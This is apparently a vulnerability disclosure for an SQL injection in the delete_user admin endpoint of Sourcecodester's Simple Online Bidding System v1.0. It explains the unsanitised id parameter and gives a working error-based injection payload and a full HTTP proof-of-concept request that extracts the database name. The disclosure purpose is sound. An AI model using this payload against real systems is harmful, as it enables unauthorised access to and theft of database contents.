SQL injection vulnerability exists in Sourcecodester Simple Online Bidding System

official website:https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

version:v1.0

route：/simple-online-bidding-system/admin/ajax.php?action=delete_user

injection parameter:$_Get['id']

#### 1.Vulnerability analysis

The parameter $_Get['id'] here is directly spliced into the sql statement after removing the null value. There is a sql injection point.

<img width="911" alt="image" src="https://github.com/xyj123a/cve/assets/141597908/d7e1353c-34cd-4e7d-b0a2-c322518db97d">
In this method, the id parameter is controllable and directly brought into the SQL statement.
<img width="950" alt="image" src="https://github.com/xyj123a/cve/assets/141597908/240557e2-a803-4ac5-b46d-1fa41be67c48">

#### 2.Vulnerability verification and exploit

We can use methods such as error injection to exploit vulnerabilities. The database name and any information about the database can be obtained through this injection point.

```
id=1%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```

POC
```
POST /simple-online-bidding-system/admin/ajax.php?action=delete_user HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 59
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/admin/index.php?page=users
Cookie: PHPSESSID=q643apn08ggv5g81r5q8pocl6t
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Forwarded-For: 192.168.1.23

id=1%20and%20updatexml(1,concat(0x7e,(database())),3)--%20q
```
<img width="1259" alt="image" src="https://github.com/xyj123a/cve/assets/141597908/e0b235c8-b310-4f15-96db-b65556983558">

Get the database name: bidding_db
